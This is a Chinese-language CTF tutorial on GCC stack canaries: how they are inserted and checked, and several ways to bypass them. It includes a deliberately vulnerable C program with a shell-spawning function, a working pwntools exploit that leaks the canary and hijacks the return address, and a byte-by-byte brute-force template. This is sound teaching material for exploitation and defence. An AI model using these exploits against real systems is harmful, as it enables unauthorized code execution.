# **Canary**

## **Canary是什么**

由于栈溢出(stack overflow)而引发的攻击非常普遍也非常古老, 相应地一种叫做canary就出现在gcc/glibc里, 直到现在也作为系统安全的第一道防线存在。

canary 实现和设计思想都比较简单, 就是插入一个值, 在stack overflow发生的高危区域的栈空间尾部, 当函数返回之时检测canary的值是否经过了改变, 以此来判断stack/buffer overflow是否发生。

Canary与windows下的GS保护都是防止栈溢出的有效手段，几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。

## **在GCC中使用Canary**

在GCC中使用以下参数设置Canary:

```shell
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector 禁用保护.
```

## Canary实现原理

当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。 这个操作即为向栈中插入Canary值，代码如下：

```
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

Canary保护的stack结构大概如下(64位)：

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | 局部变量        |
        Low     |                 |
        Address
```

在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

如果 canary 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。

这意味可以通过劫持 `__stack_chk_fail`的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容 。

进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。

事实上，TLS 中的值由函数 security_init 进行初始化。

```
static void
security_init (void)
{
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```

## Canary绕过技术

### **泄露栈中的Canary**

Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串，简单点说就是正常情况下，不能被 printf 等输出函数输出，防止泄露。 泄露栈中的 Canary 的思路是覆盖 Canary 的最后一个字节"\x00"，来打印出剩余的 Canary 部分。

这种利用方式需要存在合适的**输出函数**，或者通过**格式化字符串**泄漏。并且可能需要第一次溢出泄露 Canary，之后再次溢出恢复 Canary 最后一位，才能控制执行流程。举个例子来说：想控制 vul() 函数执行流程，需要在 vul() 内溢出两次。

**利用示例**

编译为 32bit 程序，开启 NX，ASLR，Canary 保护

``` c
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

首先通过覆盖 Canary 最后一个 `\x00` 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中

```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```

### 逐字节爆破Canary

每次进程重启后的 Canary 不同，但是同一个进程中的不同线程的 Canary 是相同的，并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存，就是子进程会继承父进程的Canary。

当我们子进程由于Canary判断不正确导致程序crash（崩溃）后，父进程不会Crash。利用这样的特点，彻底逐个字节将Canary爆破出来，爆破模板如下：

```python
print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary
```

### 劫持__stack_chk_fail 函数 

已知 Canary 失败的处理逻辑会进入到 `__stack_chk_fail`ed 函数，`__stack_chk_fail`ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。

**例题**

* 参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 `__stack_chk_fail` 的 GOT 表，再进行 ROP 利用

* [xman babystack](https://www.jianshu.com/p/110f715c210f)

### 覆盖 TLS 中储存的 Canary 值

已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。

**例题**

* StarCTF2018 babystack

### 绕过canary

这种操作的核心思想就是想办法让他不执行canary的报错或者直接跳过canary的检查。

利用格式化字符串或者数组下标越界，可以栈地址任意读写，不必**连续**向栈上写，直接写ebp和ret因此不会触发Canary检查。也就是不覆写canary。



## **参考资料**

[1] ctf-wiki.[canary-zh](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/)

[2] 23R3F.[PWN之canary骚操作](https://www.jianshu.com/p/c3624f5dd583)

